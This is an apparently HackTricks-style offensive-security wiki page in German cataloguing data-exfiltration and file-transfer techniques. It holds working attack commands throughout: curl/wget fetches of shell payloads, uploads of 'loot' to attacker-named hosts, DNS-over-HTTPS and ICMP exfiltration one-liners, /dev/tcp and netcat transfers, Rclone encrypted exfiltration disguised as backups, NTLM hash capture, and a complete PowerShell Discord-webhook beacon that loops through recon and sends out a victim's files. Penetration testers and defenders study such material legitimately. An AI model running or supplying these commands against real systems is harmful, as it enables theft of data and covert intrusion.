# Exfiltration

> [!TIP]
> Für ein durchgängiges Beispiel, bei dem Loot in `C:\Users\Public` abgelegt und mit Rclone exfiltriert wird, um legitime Backups nachzuahmen, siehe den folgenden Workflow.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Häufig zugelassene Domains zum Exfiltrieren von Informationen

Unter [https://lots-project.com/](https://lots-project.com/) findest du häufig zugelassene Domains, die missbraucht werden können.

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Dateien hochladen

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer gibt GET und POSTs aus (auch headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-Server**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

Wenn die Ausgangskontrollen auf die Überprüfung von klassischem **TCP/443** abgestimmt, für **UDP/443** jedoch freizügig sind, kann das Erzwingen von **HTTP/3** die Übertragung in **QUIC** statt in TLS-over-TCP verlagern. Der Angreifer-Endpunkt benötigt native HTTP/3-Unterstützung, beispielsweise einen Reverse Proxy oder einen Upload-Endpunkt, der bereits `Alt-Svc: h3` ankündigt.
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
Eine Forschungsarbeit aus dem Jahr 2025 (QUIC-Exfil) stellte fest, dass die verschlüsselten Header und dynamischen Adressänderungen von QUIC die Erkennung von Exfiltration auf Firewall-Ebene schwieriger machen können als bei TLS- oder DNS-basierten Channels. Außerdem wurde eine server-preferred-address-Methode demonstriert, die Exfiltration als serverseitige Connection Migration tarnt.<sup>[[9]](#references)</sup>

### Pre-signed / delegierte Object-Storage-Uploads

Wenn du eine kurzlebige **signed URL** erstellen oder erhalten kannst, benötigt das Opfer nur einen normalen HTTPS-Client. Dadurch müssen weder Cloud-SDKs noch langlebige Credentials auf dem Host installiert werden.<sup>[[8]](#references)</sup> Dies kann sich außerdem in den üblichen Object-Storage-Traffic einfügen.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 vorab signiertes `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Notes:
- Pre-signed URLs / SAS tokens beschränken normalerweise den **Pfad**, die **HTTP-Methode** und den **Ablaufzeitpunkt**.<sup>[[8]](#references)[[10]](#references)</sup>
- Für Azure Blob `Put Blob` ist `x-ms-blob-type: BlockBlob` erforderlich.<sup>[[10]](#references)</sup>
- Dieses Muster funktioniert gut mit `curl`, `Invoke-WebRequest` oder jedem benutzerdefinierten Implantat, das einen unveränderten HTTPS-`PUT` ausführen kann.

### goshs

[goshs](https://github.com/patrickhener/goshs) ist ein Ersatz für `python3 -m http.server`, der als einzelne Binary vorliegt.<sup>[[4]](#references)</sup>
Es unterstützt Upload, Download, WebDAV, SFTP, SMB, TLS, Authentifizierung, Freigabelinks und OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) für C2 & Data Exfiltration

Webhooks sind schreibgeschützte HTTPS-Endpoints, die JSON und optionale Dateiteile akzeptieren. Sie sind für vertrauenswürdige SaaS-Domains häufig erlaubt und erfordern keine OAuth/API-Keys, wodurch sie sich für Beaconing und Exfiltration mit geringem Aufwand eignen.<sup>[[5]](#references)[[6]](#references)</sup>

Zentrale Ideen:
- Endpoint: Discord verwendet https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data mit einem Part namens payload_json, der {"content":"..."} enthält, sowie optionalen Dateiteilen namens file.
- Operator-Loop-Muster: periodischer Beacon -> Verzeichnis-Recon -> gezielte Datei-Exfiltration -> Recon-Dump -> sleep. HTTP 204 NoContent/200 OK bestätigt die Zustellung.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
- Ähnliche Muster gelten für andere collaboration platforms (Slack/Teams), die ihre incoming webhooks verwenden; passe URL und JSON schema entsprechend an.
- Für DFIR von Discord Desktop Cache-Artefakten sowie die Wiederherstellung von Webhook/API-Daten siehe die unten verlinkte Seite.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (Exfiltration in cloud/object-storage)

Moderne Operatoren **stagen Beute häufig lokal** und verwenden anschließend [Rclone](https://rclone.org/), damit der Transfer wie ein normaler Backup- oder Sync-Job wirkt. Ein praktisches Muster ist:

1. Ein normales Remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. Ein `crypt`-Wrapper, damit **Inhalte und Dateinamen clientseitig verschlüsselt werden**
3. Optional ein `chunker`-Wrapper, wenn der Provider object-size-Limits erzwingt oder du kleinere Upload-Einheiten möchtest
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Hinweise:
- `crypt` kann sowohl Dateiinhalte als auch Dateinamen verschlüsseln.<sup>[[3]](#references)</sup>
- `chunker` teilt große Dateien transparent auf und setzt sie beim Download wieder zusammen.<sup>[[11]](#references)</sup>
- `rclone.conf` speichert `crypt`-Secrets in **verschleierter** Form, nicht als starken Schutz ruhender Daten.<sup>[[3]](#references)</sup> Für kurzlebige Operationen sollte eine dedizierte temporäre Konfiguration verwendet und anschließend gelöscht werden. Wenn sie länger aufbewahrt werden muss, sollte eine verschlüsselte Konfigurationsverwaltung (`RCLONE_CONFIG_PASS` / `--password-command`) verwendet werden, anstatt eine ungeschützte `rclone.conf` auf dem Datenträger zu hinterlassen.<sup>[[11]](#references)</sup>
- Wenn das Ziel bereits mit **OneDrive**, **Google Drive** oder **Dropbox** synchronisiert, kann Loot in das synchronisierte Verzeichnis kopiert werden. Dadurch lässt sich ein bereits genehmigter Client nutzen, anstatt ein neues Transfer-Binary abzulegen.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP-Server (Python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-Server (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-Server (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows**-Client
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali als Server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Oder eine SMB-Freigabe **mit Samba** erstellen:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) ist eine Alternative in Form einer einzelnen Binary, die Dateien über SMB bereitstellt und NTLM hashes von sich verbindenden Clients erfasst.<sup>[[4]](#references)</sup>
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Der Angreifer muss SSHd ausführen.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Wenn das Opfer über SSH verfügt, kann der Angreifer ein Verzeichnis des Opfers auf dem System des Angreifers einhängen.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Datei vom Opfer herunterladen
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Datei auf das Opfer hochladen
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Dank an **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS über HTTPS (DoH)

Wenn klassisches UDP/53-DNS auffällig oder blockiert ist, ausgehendes HTTPS jedoch weitgehend erlaubt ist, kann das übliche DNS-Label-Exfiltration-Muster in **DoH**-Anfragen an einen öffentlichen Resolver eingebettet werden. Halte jedes Label deutlich unter dem DNS-Limit von 63 Bytes und verwende ein DNS-sicheres Alphabet wie Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
Sortieren Sie auf dem autoritativen DNS-Server für `exf.attacker.tld` die Abfragen nach dem numerischen Präfix und rekonstruieren Sie den Base32-Stream. Dadurch bleibt der Transport innerhalb von HTTPS zum Resolver, statt klassisches UDP/53-DNS zu verwenden.<sup>[[2]](#references)</sup>

Vollständige Tools für bidirektionale DNS-Tunnel (`iodine`, `dnscat2` usw.) finden Sie auf [der Tunneling-Seite](tunneling-and-port-forwarding.md).

## **SMTP**

Wenn Sie Daten an einen SMTP-Server senden können, können Sie mit Python einen SMTP-Server zum Empfangen der Daten erstellen:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) kann schnell einen SMTP-Server starten, um E-Mail-Callbacks bei OOB-Exfiltrationsszenarien abzufangen.<sup>[[4]](#references)</sup>
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Empfangene E-Mails und Callbacks werden direkt in der Terminalausgabe angezeigt.
Kann für eine vollständige OOB-Abdeckung mit dem DNS-Callback-Server kombiniert werden:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

Standardmäßig in XP und 2003 (bei anderen muss es während der Installation explizit hinzugefügt werden)

In Kali: **TFTP-Server starten**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-Server in Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Auf **victim** eine Verbindung zum Kali-Server herstellen:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Eine Datei mit einem PHP-Oneliner herunterladen:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Opfer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Das Programm `debug.exe` ermöglicht nicht nur die Untersuchung von Binärdateien, sondern kann sie auch **aus Hexadezimaldaten wiederherstellen**. Das bedeutet, dass `debug.exe` durch die Bereitstellung der Hexadezimaldaten einer Binärdatei die Binärdatei erzeugen kann. Es ist jedoch wichtig zu beachten, dass debug.exe Dateien nur bis zu einer Größe von **64 KB assemblieren** kann.<sup>[[1]](#references)</sup>
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Dann kopiere den Text in die windows-shell und füge ihn dort ein. Eine Datei namens nc.exe wird erstellt.

## References

- [1] [Dateien nach Windows übertragen](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS – DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone-Backend `crypt`](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord als C2 und die zurückbleibenden zwischengespeicherten Beweise](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord-Webhooks – Webhook ausführen](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (Cache-Parser)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Objekte mit presigned URLs hochladen – Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Ausnutzen der Server Preferred Address-Funktion von QUIC für Datenexfiltrationsangriffe](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) – Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone-Dokumentation](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
